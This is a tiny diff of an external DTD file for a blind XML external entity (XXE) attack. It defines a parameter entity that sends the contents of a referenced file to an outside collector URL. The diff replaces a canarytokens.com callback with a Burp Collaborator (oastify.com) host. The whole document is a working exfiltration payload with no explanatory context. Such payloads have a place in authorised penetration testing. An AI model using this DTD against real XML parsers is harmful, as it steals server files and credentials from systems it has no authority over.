@@ -1,4 +1,2 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://canarytokens.com/images/traffic/about/dhd774x13jhind4kr5qf6t8gk/submit.aspx/?collect=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://gl5ki7mltfc9kqu8seqal8a81z7qviq6f.oastify.com//?collect=%file;'>">
 %all;
-
-
